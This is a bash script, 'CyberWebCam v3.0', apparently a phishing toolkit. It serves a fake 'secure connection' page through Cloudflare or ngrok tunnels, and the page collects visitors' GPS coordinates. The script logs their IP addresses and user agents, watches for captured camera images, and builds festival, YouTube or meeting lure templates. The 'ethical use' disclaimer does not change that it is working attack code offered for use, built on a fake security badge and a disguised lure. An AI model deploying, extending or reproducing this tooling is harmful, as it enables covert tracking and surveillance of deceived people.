#!/bin/bash
# CyberWebCam v3.0 - Professional Webcam Testing Suite
# Author: CyberRoninX1
# For ethical security testing and educational purposes only
# Usage: Test webcam functionality, location services, and security awareness

set -e

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Global variables
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SESSION_ID=$(date +%Y%m%d_%H%M%S)
RESULTS_DIR="results_$SESSION_ID"
windows_mode=false

# Banner function
banner() {
    clear
    echo -e "${CYAN}"
    echo "   ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗    ██╗███████╗██████╗ "
    echo "  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║    ██║██╔════╝██╔══██╗"
    echo "  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║ █╗ ██║█████╗  ██████╔╝"
    echo "  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║███╗██║██╔══╝  ██╔══██╗"
    echo "  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║╚███╔███╔╝███████╗██║  ██║"
    echo "   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${YELLOW}          Professional Webcam Testing Suite v3.0${NC}"
    echo -e "${WHITE}          Author: CyberRoninX1 | Ethical Use Only${NC}"
    echo -e "${BLUE}          ⚠️  For authorized security testing only ⚠️${NC}"
    echo ""
}

# Windows compatibility
detect_os() {
    if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]]; then
        windows_mode=true
        echo -e "${YELLOW}[!] Windows system detected - using compatibility mode${NC}"
        
        function kill_process() {
            taskkill //F //IM "$1" 2>/dev/null || true
        }
    else
        function kill_process() {
            pkill -f "$1" 2>/dev/null || true
            killall "$1" 2>/dev/null || true
        }
    fi
}

# Check dependencies
check_dependencies() {
    local deps=("php" "curl" "wget")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[!] Missing dependencies: ${missing[*]}${NC}"
        echo -e "${YELLOW}[*] Please install missing dependencies and try again${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] All dependencies satisfied${NC}"
}

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    
    # Kill processes
    kill_process "php"
    kill_process "ngrok"
    kill_process "cloudflared"
    
    # Remove temporary files (keep results)
    rm -f index.php index2.html index3.html 2>/dev/null
    rm -f ip.txt Log.log LocationError.log 2>/dev/null
    rm -f .cloudflared.log 2>/dev/null
    
    echo -e "${GREEN}[+] Cleanup complete${NC}"
    exit 0
}

# Trap Ctrl+C
trap cleanup SIGINT SIGTERM

# Download Cloudflared
download_cloudflared() {
    local binary="cloudflared"
    [[ "$windows_mode" == true ]] && binary="cloudflared.exe"
    
    if [[ -f "$binary" ]]; then
        return 0
    fi
    
    echo -e "${GREEN}[+] Downloading Cloudflared...${NC}"
    
    local arch=$(uname -m)
    local os=$(uname -s)
    
    if [[ "$windows_mode" == true ]]; then
        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe
        chmod +x cloudflared.exe
    elif [[ "$os" == "Darwin" ]]; then
        if [[ "$arch" == "arm64" ]]; then
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz
        else
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz
        fi
        tar -xzf cloudflared.tgz
        chmod +x cloudflared
        rm cloudflared.tgz
    else
        case "$arch" in
            x86_64)  wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared ;;
            aarch64) wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared ;;
            armv7l)  wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared ;;
            *)       wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared ;;
        esac
        chmod +x cloudflared
    fi
    
    echo -e "${GREEN}[+] Cloudflared downloaded${NC}"
}

# Download Ngrok
download_ngrok() {
    local binary="ngrok"
    [[ "$windows_mode" == true ]] && binary="ngrok.exe"
    
    if [[ -f "$binary" ]]; then
        return 0
    fi
    
    echo -e "${GREEN}[+] Downloading Ngrok...${NC}"
    
    local arch=$(uname -m)
    local os=$(uname -s)
    
    if [[ "$windows_mode" == true ]]; then
        wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip
        unzip -q ngrok.zip
        rm ngrok.zip
    elif [[ "$os" == "Darwin" ]]; then
        if [[ "$arch" == "arm64" ]]; then
            wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip
        else
            wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip
        fi
        unzip -q ngrok.zip
        rm ngrok.zip
    else
        case "$arch" in
            x86_64)  wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip ;;
            aarch64) wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip ;;
            armv7l)  wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip ;;
            *)       wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip ;;
        esac
        unzip -q ngrok.zip
        rm ngrok.zip
    fi
    
    chmod +x "$binary"
    echo -e "${GREEN}[+] Ngrok downloaded${NC}"
}

# Setup ngrok authentication
setup_ngrok_auth() {
    local ngrok_binary="./ngrok"
    [[ "$windows_mode" == true ]] && ngrok_binary="./ngrok.exe"
    
    local ngrok_config=""
    if [[ "$windows_mode" == true ]]; then
        ngrok_config="$USERPROFILE\\.ngrok2\\ngrok.yml"
    else
        ngrok_config="$HOME/.ngrok2/ngrok.yml"
    fi
    
    if [[ -f "$ngrok_config" ]]; then
        echo -e "${YELLOW}[!] Existing ngrok configuration detected${NC}"
        read -p "Do you want to update authtoken? [y/N]: " update_token
        if [[ "$update_token" =~ ^[Yy]$ ]]; then
            read -sp "Enter ngrok authtoken: " ngrok_auth
            echo
            $ngrok_binary authtoken "$ngrok_auth" >/dev/null 2>&1
            echo -e "${GREEN}[+] Authtoken updated${NC}"
        fi
    else
        read -p "Enter ngrok authtoken (optional, press Enter to skip): " ngrok_auth
        if [[ -n "$ngrok_auth" ]]; then
            $ngrok_binary authtoken "$ngrok_auth" >/dev/null 2>&1
            echo -e "${GREEN}[+] Authtoken configured${NC}"
        else
            echo -e "${YELLOW}[!] No authtoken provided - limited functionality${NC}"
        fi
    fi
}

# Start PHP server
start_php_server() {
    echo -e "${GREEN}[+] Starting PHP server on port 3333...${NC}"
    php -S 127.0.0.1:3333 >/dev/null 2>&1 &
    sleep 2
    
    if ! pgrep -f "php -S" >/dev/null 2>&1; then
        echo -e "${RED}[!] Failed to start PHP server${NC}"
        return 1
    fi
    return 0
}

# Generate payload with template
generate_payload() {
    local link="$1"
    local template="$2"
    local template_file=""
    
    case $template in
        1) template_file="festival_template.html" ;;
        2) template_file="youtube_template.html" ;;
        3) template_file="meeting_template.html" ;;
        *) template_file="meeting_template.html" ;;
    esac
    
    # Create main index.php that handles location and redirects
    cat > index.php << 'PHPEOF'
<?php
include 'ip.php';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Loading Secure Connection...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .loader-container {
            text-align: center;
            background: rgba(255,255,255,0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 { color: #333; margin-bottom: 10px; }
        p { color: #666; margin: 5px 0; }
        .status { color: #667eea; font-weight: 500; margin-top: 15px; }
        .secure-badge {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
    </style>
    <script>
        let locationSent = false;
        
        function debugLog(msg) {
            if (msg.includes("Lat:") || msg.includes("Location captured")) {
                console.log("[Secure] " + msg);
                sendDebugLog(msg);
            }
        }
        
        function sendDebugLog(msg) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "debug_log.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("message=" + encodeURIComponent(msg));
        }
        
        function getLocation() {
            document.getElementById("locationStatus").innerHTML = "Requesting location access...";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    sendPosition,
                    handleError,
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                document.getElementById("locationStatus").innerHTML = "Geolocation not supported";
                setTimeout(redirectToContent, 2000);
            }
        }
        
        function sendPosition(position) {
            if (locationSent) return;
            locationSent = true;
            
            debugLog("Location captured - Lat: " + position.coords.latitude + ", Lon: " + position.coords.longitude);
            document.getElementById("locationStatus").innerHTML = "Location verified, loading content...";
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    setTimeout(redirectToContent, 500);
                }
            };
            xhr.send("lat=" + position.coords.latitude + "&lon=" + position.coords.longitude + 
                     "&acc=" + position.coords.accuracy + "&time=" + Date.now());
        }
        
        function handleError(error) {
            var msg = "";
            switch(error.code) {
                case error.PERMISSION_DENIED: msg = "Location permission denied"; break;
                case error.POSITION_UNAVAILABLE: msg = "Location unavailable"; break;
                case error.TIMEOUT: msg = "Location request timeout"; break;
                default: msg = "Unknown location error";
            }
            document.getElementById("locationStatus").innerHTML = msg + " - continuing...";
            setTimeout(redirectToContent, 2000);
        }
        
        function redirectToContent() {
            window.location.href = "forwarding_link/index2.html";
        }
        
        window.onload = function() {
            setTimeout(getLocation, 500);
        };
    </script>
</head>
<body>
    <div class="loader-container">
        <div class="spinner"></div>
        <h2>Establishing Secure Connection</h2>
        <p>Please wait while we verify your connection</p>
        <div class="status" id="locationStatus">Initializing...</div>
        <div class="secure-badge">🔒 Secure SSL Connection • 256-bit Encryption</div>
    </div>
</body>
</html>
PHPEOF

    # Process template
    sed "s|forwarding_link|$link|g" "$template_file" > index2.html
    
    echo -e "${GREEN}[+] Payload generated successfully${NC}"
}

# Monitor for incoming data
monitor_results() {
    mkdir -p "$RESULTS_DIR"
    
    echo -e "\n${GREEN}[+] Monitoring for incoming connections...${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop monitoring${NC}\n"
    
    while true; do
        # Check for IP data
        if [[ -f "ip.txt" ]] && [[ -s "ip.txt" ]]; then
            echo -e "\n${GREEN}[+] New connection detected!${NC}"
            echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            
            local ip=$(grep -oP 'IP: \K[0-9.]+' ip.txt 2>/dev/null || grep -o 'IP: [0-9.]\+' ip.txt | cut -d' ' -f2)
            local ua=$(grep -o 'User-Agent:.*' ip.txt 2>/dev/null | cut -d' ' -f2-)
            
            echo -e "${CYAN}📡 IP Address:${NC} $ip"
            echo -e "${CYAN}🌐 User Agent:${NC} $ua"
            echo -e "${CYAN}⏰ Timestamp:${NC} $(date)"
            
            # Save to results
            {
                echo "=== Connection $(date +%Y%m%d_%H%M%S) ==="
                cat ip.txt
                echo ""
            } >> "$RESULTS_DIR/connections.log"
            
            mv ip.txt "$RESULTS_DIR/ip_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null
            echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
        fi
        
        # Check for location data
        if [[ -f "current_location.txt" ]] && [[ -s "current_location.txt" ]]; then
            echo -e "\n${GREEN}[+] Location data received!${NC}"
            echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            
            local lat=$(grep 'Latitude:' current_location.txt | cut -d' ' -f2)
            local lon=$(grep 'Longitude:' current_location.txt | cut -d' ' -f2)
            local acc=$(grep 'Accuracy:' current_location.txt | cut -d' ' -f2)
            
            echo -e "${CYAN}📍 Latitude:${NC} $lat"
            echo -e "${CYAN}📍 Longitude:${NC} $lon"
            echo -e "${CYAN}🎯 Accuracy:${NC} ${acc}m"
            echo -e "${CYAN}🗺️ Maps Link:${NC} https://www.google.com/maps?q=$lat,$lon"
            
            # Save location data
            local loc_file="$RESULTS_DIR/location_$(date +%Y%m%d_%H%M%S).txt"
            cp current_location.txt "$loc_file"
            rm -f current_location.txt
            rm -f location_*.txt 2>/dev/null
            
            echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
        fi
        
        # Check for camera images
        if ls cam*.png 2>/dev/null | grep -q .; then
            for img in cam*.png; do
                echo -e "\n${GREEN}[+] Camera image captured: $img${NC}"
                mv "$img" "$RESULTS_DIR/" 2>/dev/null
            done
        fi
        
        # Cleanup logs
        rm -f LocationLog.log LocationError.log Log.log debug_log.log 2>/dev/null
        
        sleep 1
    done
}

# Cloudflare tunnel method
start_cloudflare_tunnel() {
    echo -e "\n${BLUE}[*] Starting Cloudflare Tunnel...${NC}"
    
    download_cloudflared
    start_php_server || return 1
    
    local binary="./cloudflared"
    [[ "$windows_mode" == true ]] && binary="./cloudflared.exe"
    
    rm -f .cloudflared.log
    $binary tunnel --url 127.0.0.1:3333 --logfile .cloudflared.log >/dev/null 2>&1 &
    
    sleep 8
    
    local link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .cloudflared.log | head -1)
    
    if [[ -z "$link" ]]; then
        echo -e "${RED}[!] Failed to create Cloudflare tunnel${NC}"
        echo -e "${YELLOW}[*] Troubleshooting tips:${NC}"
        echo "  1. Check your internet connection"
        echo "  2. Try running: $binary tunnel --url 127.0.0.1:3333"
        echo "  3. Cloudflare service might be temporarily unavailable"
        return 1
    fi
    
    echo -e "${GREEN}[+] Tunnel established!${NC}"
    echo -e "${CYAN}🔗 Share this link:${NC} $link"
    echo -e "${YELLOW}⚠️  This link expires when the tunnel stops${NC}"
    
    generate_payload "$link" "$SELECTED_TEMPLATE"
    monitor_results
}

# Ngrok tunnel method
start_ngrok_tunnel() {
    echo -e "\n${BLUE}[*] Starting Ngrok Tunnel...${NC}"
    
    download_ngrok
    setup_ngrok_auth
    start_php_server || return 1
    
    local binary="./ngrok"
    [[ "$windows_mode" == true ]] && binary="./ngrok.exe"
    
    $binary http 3333 >/dev/null 2>&1 &
    
    sleep 8
    
    local link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*\.ngrok-free.app' | head -1)
    
    if [[ -z "$link" ]]; then
        echo -e "${RED}[!] Failed to create Ngrok tunnel${NC}"
        echo -e "${YELLOW}[*] Troubleshooting tips:${NC}"
        echo "  1. Check your internet connection"
        echo "  2. Valid authtoken may be required"
        echo "  3. Try running: $binary http 3333"
        return 1
    fi
    
    echo -e "${GREEN}[+] Tunnel established!${NC}"
    echo -e "${CYAN}🔗 Share this link:${NC} $link"
    echo -e "${YELLOW}⚠️  This link expires when the tunnel stops${NC}"
    
    generate_payload "$link" "$SELECTED_TEMPLATE"
    monitor_results
}

# Template selection menu
select_template() {
    echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${WHITE}           SELECT TESTING TEMPLATE${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    
    echo -e "${GREEN}[1]${NC} Festival Wishes Template"
    echo -e "${GREEN}[2]${NC} YouTube Live Template"
    echo -e "${GREEN}[3]${NC} Virtual Meeting Template"
    echo -e "${GREEN}[4]${NC} Custom Template (Coming Soon)"
    
    echo ""
    read -p "Select template [1-3] (default: 1): " template_choice
    SELECTED_TEMPLATE="${template_choice:-1}"
    
    if [[ ! "$SELECTED_TEMPLATE" =~ ^[1-3]$ ]]; then
        echo -e "${YELLOW}[!] Invalid choice, using default (1)${NC}"
        SELECTED_TEMPLATE=1
    fi
}

# Tunnel selection menu
select_tunnel() {
    echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${WHITE}           SELECT TUNNEL METHOD${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    
    echo -e "${GREEN}[1]${NC} Cloudflare Tunnel (Recommended - No Auth Required)"
    echo -e "${GREEN}[2]${NC} Ngrok Tunnel (Requires Optional Auth)"
    
    echo ""
    read -p "Select tunnel method [1-2] (default: 1): " tunnel_choice
    TUNNEL_METHOD="${tunnel_choice:-1}"
    
    if [[ ! "$TUNNEL_METHOD" =~ ^[1-2]$ ]]; then
        echo -e "${YELLOW}[!] Invalid choice, using default (1)${NC}"
        TUNNEL_METHOD=1
    fi
}

# Show disclaimer
show_disclaimer() {
    echo -e "\n${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║                    LEGAL DISCLAIMER                          ║${NC}"
    echo -e "${RED}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${RED}║  This tool is for EDUCATIONAL and AUTHORIZED SECURITY       ║${NC}"
    echo -e "${RED}║  TESTING purposes ONLY.                                     ║${NC}"
    echo -e "${RED}║                                                              ║${NC}"
    echo -e "${RED}║  • Only test systems you OWN or have WRITTEN PERMISSION     ║${NC}"
    echo -e "${RED}║  • Unauthorized access is ILLEGAL                           ║${NC}"
    echo -e "${RED}║  • The author assumes NO LIABILITY for misuse               ║${NC}"
    echo -e "${RED}║  • By using this tool, you agree to these terms             ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
    
    echo ""
    read -p "Do you accept these terms and have authorization? (yes/no): " acceptance
    if [[ ! "$acceptance" =~ ^[Yy](es)?$ ]]; then
        echo -e "${RED}[!] You must accept the terms to use this tool${NC}"
        exit 1
    fi
}

# Main function
main() {
    banner
    show_disclaimer
    detect_os
    check_dependencies
    
    select_template
    select_tunnel
    
    echo -e "\n${GREEN}[+] Starting CyberWebCam v3.0${NC}"
    echo -e "${YELLOW}[*] Results will be saved to: $RESULTS_DIR${NC}\n"
    
    mkdir -p "$RESULTS_DIR"
    
    case $TUNNEL_METHOD in
        1) start_cloudflare_tunnel ;;
        2) start_ngrok_tunnel ;;
    esac
}

# Run main function
main "$@"
